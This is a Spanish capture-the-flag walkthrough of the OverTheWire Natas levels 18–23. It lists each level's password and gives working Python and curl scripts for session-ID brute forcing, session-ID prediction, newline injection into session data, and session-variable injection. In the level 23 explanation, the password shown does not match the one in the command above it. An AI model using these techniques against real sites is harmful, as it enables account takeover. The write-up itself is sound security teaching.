# Nivel 18-23

### NIVEL 18

Ingresamos las credenciales para el nivel 18.

* **Usuario:** `natas18`
* **Contraseña:** `6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ`

Tras iniciar sesión, nos encontramos con la página de inicio del **Nivel 18**. Se nos muestra en la página para hacer **Login** con nuestro usuario y contraseña pero que iniciemos sesión con las credenciales típicas admin:admin.&#x20;

<figure><img src="../../../.gitbook/assets/image (310).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (311).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (312).png" alt=""><figcaption></figcaption></figure>

En el código fuente, la directiva

```php
$maxid = 640; 
```

nos sugiere que el valor de `PHPSESSID` puede asumir hasta 640 posibles valores. Este número es lo suficientemente bajo como para permitir un ataque de fuerza bruta contra la variable `PHPSESSID` con el fin de realizar un **Session Hijacking**. Por lo que realizamos un script que lo haga por nosotros.

```python
import requests

# URL objetivo
target = 'http://natas18.natas.labs.overthewire.org'
# Credenciales para la autenticación básica
auth = ('natas18', '6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ')
# Parámetros de la solicitud
params = dict(username='admin', password='admin')
# Cookies iniciales
cookies = dict()

# Número máximo de IDs de sesión
max_s_id = 640
s_id = 1

while s_id <= max_s_id:
    # Mostrar el ID de sesión actual
    print("Trying with PHPSESSID = " + str(s_id))
    
    # Configurar la cookie PHPSESSID
    cookies = dict(PHPSESSID=str(s_id))
    
    # Realizar la solicitud GET
    r = requests.get(target, auth=auth, params=params, cookies=cookies)
    
    # Verificar si el texto en la respuesta indica que el usuario es administrador
    if "You are an admin" in r.text:
        print(r.text)
        break
    
    # Incrementar el ID de sesión
    s_id += 1
```

<figure><img src="../../../.gitbook/assets/Captura de pantalla 2024-08-19 200935.png" alt=""><figcaption></figcaption></figure>

### NIVEL 19

Ingresamos las credenciales para el nivel 19.

* **Usuario:** `natas19`
* **Contraseña:** `tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr`

Tras iniciar sesión, nos encontramos con la página de inicio del **Nivel 19**.  Se nos muestra en la página para hacer **Login** con nuestro usuario y contraseña. Como los valores de `PHPSESSID` no siguen un patrón secuencial, es necesario analizar la aleatoriedad para intentar predecirlos. Para lograr esto, debemos recolectar una cantidad significativa de valores de `PHPSESSID` generados y luego aplicar técnicas estadísticas para entender el patrón.

<figure><img src="../../../.gitbook/assets/image (313).png" alt=""><figcaption></figcaption></figure>

```python
#!/usr/bin/env python

import requests
import os
import sys

def collect_stat(phpsessid, sess_id):
    for i in range(len(sess_id)):
        char_at_pos = phpsessid[i]
        char_at_pos[sess_id[i]] += 1

def get_max(chars={}):
    max_freq = 0
    max_char = 'a'
    for c in chars:
        if chars[c] >= max_freq:
            max_freq = chars[c]
            max_char = c
    return max_char, max_freq

def print_stat(phpsessid, n_captures):
    i = 0
    for c in phpsessid:
        l, f = get_max(c)
        print(("  char at position %2.1d of PHPSESSID is '%c' with accuracy %2.2f%%") %
              (i, l, (f*100)/n_captures))
        i += 1

target = 'http://natas19.natas.labs.overthewire.org'
auth = ('natas19', 'tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr')
params = dict(username='admin', password='admin')
cookies = dict()

# Recopila PHPSESSIDs
filename = './phpsessids.txt'
i_max = 300
i = 0

if not os.path.exists(filename):
    with open(filename, 'a') as f:
        print('Collecting data (%d requests)' % i_max)
        while i <= i_max:
            r = requests.get(target, auth=auth, params=params, cookies=cookies)
            f.write('%s\n' % r.cookies['PHPSESSID'])
            i += 1
            sys.stderr.write('.')
        sys.stderr.write('\n\n')

# Analiza los IDs recopilados
lens = {}
ids = []
with open(filename) as f:
    ids = f.readlines()
tot = len(ids)

for id in ids:
    k = str(len(id.strip()))
    if k in lens:
        lens[k] += 1
    else:
        lens[k] = 1

print("Just a simple analysis: ")
for k in lens:
    print('  PHPSESSIDs with %s chars: %2.2f%%' % (k, (lens[k] * 100) / tot))

print("")

# Analiza la frecuencia de caracteres
sys.stdout.write('Choose length: ')
l = int(input())

phpsessid = []

for i in range(l):
    phpsessid.append({'0': 0, '1': 0, '2': 0, '3': 0, '4': 0, '5': 0, '6': 0,
                      '7': 0, '8': 0, '9': 0, 'a': 0, 'b': 0, 'c': 0, 'd': 0,
                      'e': 0, 'f': 0})

n_captures = 0

if l is not None:
    for id in ids:
        if len(id.strip()) == l:
            collect_stat(phpsessid, id.strip())
            n_captures += 1

print("\nWith %d captures" % i_max)
print_stat(phpsessid, n_captures)
```

#### Descripción del Script

1. **Recopilación de `PHPSESSID`**:
   * Genera una lista de valores `PHPSESSID` realizando solicitudes al servidor y guarda los valores en un archivo.
2. **Análisis de los IDs recopilados**:
   * Calcula el porcentaje de aparición de cada longitud de `PHPSESSID`.
   * Analiza la frecuencia de caracteres en cada posición de los `PHPSESSID` para identificar patrones.
3. **Estadísticas**:
   * Muestra estadísticas sobre la frecuencia de caracteres en cada posición del `PHPSESSID` basado en los datos recopilados.

Este script es útil para evaluar la aleatoriedad de los valores `PHPSESSID` y puede ayudar a predecir futuros valores de sesión.

<figure><img src="../../../.gitbook/assets/Captura de pantalla 2024-08-19 202047.png" alt=""><figcaption></figcaption></figure>

El análisis muestra que los `PHPSESSID` de longitud 18 son los más comunes. En los `PHPSESSID` de longitud 18, varios caracteres tienen una precisión del 100% en sus posiciones respectivas, lo que sugiere que estos caracteres son consistentes y predecibles.

Ahora podemos intentar con un ataque de fuerza bruta porque el rango de soluciones posibles es razonable (16x16x16).

```python
#!/usr/bin/env python

import requests
import sys

# URL objetivo
target = 'http://natas19.natas.labs.overthewire.org'
# Credenciales para la autenticación básica
auth = ('natas19', 'tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr')
# Parámetros de la solicitud
params = dict(username='admin', password='s3cr3t')
# Cookies iniciales
cookies = dict()

# Inicialización de variables
x = 0x0
y = 0x0
z = 0x0

# Bucle para probar diferentes valores de PHPSESSID
while x <= 0xf:
    while y <= 0xf:
        while z <= 0xf:
            # Construir el valor de PHPSESSID
            phpsessid = ('3%s3%s3%s2d61646d696e' % 
                         (hex(x)[2:], hex(y)[2:], hex(z)[2:]))
            cookies['PHPSESSID'] = phpsessid
            print('Trying with: %s' % phpsessid)
            
            # Realizar la solicitud GET
            r = requests.get(target, auth=auth, params=params, cookies=cookies)
            
            # Verificar la respuesta
            if "You are logged in as a regular user." not in r.text:
                print(r.text)
                sys.exit(0)
            
            # Incrementar z
            z += 1
        
        # Incrementar y y reiniciar z
        y += 1
        z = 0x0
    
    # Incrementar x y reiniciar y y z
    x += 1
    y = 0x0
    z = 0x0

# Finalizar el script si no se encontró una sesión válida
sys.exit(1)
```

<figure><img src="../../../.gitbook/assets/image (314).png" alt=""><figcaption></figcaption></figure>

### NIVEL 20

Ingresamos las credenciales para el nivel 20.

* **Usuario:** `natas20`
* **Contraseña:**`p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw`

Tras iniciar sesión, nos encontramos con la página de inicio del **Nivel 20**.  Se nos muestra en la página para cambiar nuestro nombre pero debemos iniciar sesión como administrador.&#x20;

<figure><img src="../../../.gitbook/assets/image (315).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (316).png" alt=""><figcaption></figcaption></figure>

En este nivel, es realista decir que el ID de sesión no puede ser predicho. De hecho, parece ser totalmente aleatorio.

Al observar el código fuente, podemos ver que se definieron manejadores personalizados para la gestión del almacenamiento de sesiones. En nuestro caso, los que nos interesan son `myread()` y `mywrite()`.

En `myread()` podemos ver que el contenido del archivo de sesión se divide utilizando  (salto de línea) como carácter separador.

```php
$_SESSION = array();
foreach(explode("\n", $data) as $line) {
    debug("Read [$line]");
    ...
}
```

Además, para llenar el array `$_SESSION`, se espera que cada línea tenga la forma clave valor.

```php
$_SESSION = array();
foreach(explode("\n", $data) as $line) {
    ...
    $parts = explode(" ", $line, 2);
    if($parts[0] != "")
        $_SESSION[$parts[0]] = $parts[1];
}
```

Para autenticarse como administrador, la página verifica si la sesión contiene la clave `admin` y si su valor es `1`.

```php
function print_credentials() { /* {{{ */
    if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) {
        print "You are an admin. The credentials for the next level are:<br>";
        print "<pre>Username: natas21\n";
        print "Password: <censored></pre>";
    } else {
        print "You are logged in as a regular user. Login as an admin to retrieve credentials for natas21.";
    }
}
```

Cuando se envía un parámetro llamado `name`, se inicializa una nueva sesión y el valor de `name` se almacena en ella.

```python
import requests

# URL objetivo
target = 'http://natas20.natas.labs.overthewire.org'
# Credenciales 
auth = ('natas20', 'p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw')

# Primera solicitud
print("#")
print("# FIRST REQUEST")
print("#")
params = dict(name='admin\nadmin 1', debug='')  
cookies = dict()
r = requests.get(target, auth=auth, params=params, cookies=cookies)
phpsessid = r.cookies['PHPSESSID']
print(r.text)

print("\n\n")
print("#")
print("# SECOND REQUEST")
print("#")
params = dict(debug='')
cookies = dict(PHPSESSID=phpsessid)
r = requests.get(target, auth=auth, params=params, cookies=cookies)
print(r.text)

```

Este código realiza un ataque de manipulación de sesión en un desafío de seguridad web.

1. **Primera Solicitud:**
   * Envía una solicitud GET a la URL objetivo con los parámetros `name='admin\nadmin 1'` y `debug=''`.
   * Este parámetro `name` incluye un salto de línea (), que puede manipular cómo el servidor trata la información de la sesión.
   * Guarda la cookie de sesión (`PHPSESSID`) que recibe como respuesta.
2. **Segunda Solicitud:**
   * Envía una segunda solicitud GET usando la misma cookie de sesión obtenida en la primera solicitud.
   * Debido a la manipulación de la sesión en la primera solicitud, la segunda puede devolver una respuesta diferente, posiblemente dando acceso a privilegios administrativos o información sensible.

<figure><img src="../../../.gitbook/assets/image (317).png" alt=""><figcaption></figcaption></figure>

### NIVEL 21

Ingresamos las credenciales para el nivel 21.

* **Usuario:** `natas21`
* **Contraseña:** `BPhv63cKE1lkQl04cE5CuFTzXe15NfiH`

Tras iniciar sesión, nos encontramos con la página de inicio del **Nivel 21**. Se nos muestra que la página ha sido colocada en otra URL por lo que revisamos el código fuente.&#x20;

<figure><img src="../../../.gitbook/assets/image (318).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (319).png" alt=""><figcaption></figcaption></figure>

La función `print_credentials()` en la página principal verifica si `$_SESSION` tiene el parámetro `admin` y si su valor es igual a 1.

```php
if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) {
    print "You are an admin. The credentials for the next level are:<br>";
    print "<pre>Username: natas22\n";
    print "Password: <censored></pre>";
} else {
    print "You are logged in as a regular user. Login as an admin to retrieve credentials for natas22.";
}
```

En la página "experimenter", si `$_REQUEST` contiene la clave `submit`, todos los atributos contenidos se guardan en `$_SESSION`.

```php
if(array_key_exists("submit", $_REQUEST)) {
    foreach($_REQUEST as $key => $val) {
        $_SESSION[$key] = $val;
    }
}
```

El ataque se define de la siguiente manera: Al pasar `admin=1` en la página de "experimenter", podremos obtener la contraseña para Natas22.

```python
import requests

# URL objetivo para enviar el valor admin=1
target = 'http://natas21-experimenter.natas.labs.overthewire.org'
auth = ('natas21', 'BPhv63cKE1lkQl04cE5CuFTzXe15NfiH')

# Enviamos el valor admin=1 en la solicitud
params = dict(debug='', submit='', admin=1)  
cookies = dict()
r = requests.get(target, auth=auth, params=params, cookies=cookies)
phpsessid = r.cookies['PHPSESSID']
print(r.text)

# URL objetivo para verificar el resultado
target = 'http://natas21.natas.labs.overthewire.org'
params = dict(debug='')
cookies = dict(PHPSESSID=phpsessid)
r = requests.get(target, auth=auth, params=params, cookies=cookies)
print(r.text)
```

Este código realiza dos solicitudes HTTP GET: la primera establece el valor `admin=1` en la sesión para obtener la cookie de sesión, y la segunda usa esa cookie para acceder a la página principal y obtener las credenciales para el siguiente nivel.

<figure><img src="../../../.gitbook/assets/image (320).png" alt=""><figcaption></figcaption></figure>

### NIVEL 22

Ingresamos las credenciales para el nivel 22.

* **Usuario:** `natas22`
* **Contraseña:** `d8rwGBl0Xslg3b76uh3fEbSlnOUBlozz`

Tras iniciar sesión, nos encontramos con la página de inicio del **Nivel 22**. NO se nos muestra nada relevante por lo que revisamos el código fuente.&#x20;

<figure><img src="../../../.gitbook/assets/image (321).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (322).png" alt=""><figcaption></figcaption></figure>

Viendo el código fuente realizamos este comando:

```bash
curl -i -XGET -u natas22:d8rwGBl0Xslg3b76uh3fEbSlnOUBlozz http://natas22.natas.labs.overthewire.org/?revelio
```

* **Autenticación Básica**:
  * `curl` realiza una solicitud HTTP a la URL especificada utilizando las credenciales de autenticación básica (`natas22` y `d8rwGBl0Xslg3b76uh3fEbSlnOUBlozz`). Esto asegura que solo los usuarios autenticados puedan acceder a la página.
* **Solicitud GET con Parámetro `revelio`**:
  * La solicitud GET se envía a la URL con el parámetro `revelio` en la cadena de consulta. Según el código PHP proporcionado anteriormente, este parámetro se usa para revelar las credenciales del siguiente nivel si el usuario está autenticado como administrador.
* **Mostrar Encabezados y Respuesta**:
  * La opción `-i` incluye los encabezados HTTP en la respuesta, por lo que puedes ver información adicional sobre la respuesta, como el código de estado HTTP y otros encabezados.

<figure><img src="../../../.gitbook/assets/image (323).png" alt=""><figcaption></figcaption></figure>

### NIVEL 23

Ingresamos las credenciales para el nivel 23.

* **Usuario:** `natas23`
* **Contraseña:** `dIUQcI3uSus1JEOSSWRAEXBG8KbR8tRs`

Tras iniciar sesión, nos encontramos con la página de inicio del **Nivel 23**. Se nos muestra para ingresar una contraseña por lo que revisamos el código fuente para más información.

<figure><img src="../../../.gitbook/assets/image (325).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (326).png" alt=""><figcaption></figcaption></figure>

Viendo el código fuente realizamos este comando:

```bash
curl -XGET -u natas23:dIUQcI3uSus1JEOSSWRAEXBG8KbR8tRs http://natas23.natas.labs.overthewire.org/?passwd=20%20iloveyou
```

* **Autenticación Básica**:
  * `-u natas23:D0vlad33nQF0Hz2EP255TP5wSW9ZsRSE`
  * Proporciona las credenciales necesarias para autenticar al usuario `natas23` con la contraseña `D0vlad33nQF0Hz2EP255TP5wSW9ZsRSE`.
* **Método GET**:
  * `-XGET`
  * Realiza una solicitud GET al servidor.
*   **Parámetro `passwd`**:

    * `?passwd=20%20iloveyou`
    * Envía la contraseña `20 iloveyou`, que debe cumplir con los requisitos de la página para revelar las credenciales del siguiente nivel.

    <figure><img src="../../../.gitbook/assets/Captura de pantalla 2024-08-19 220625.png" alt=""><figcaption></figcaption></figure>
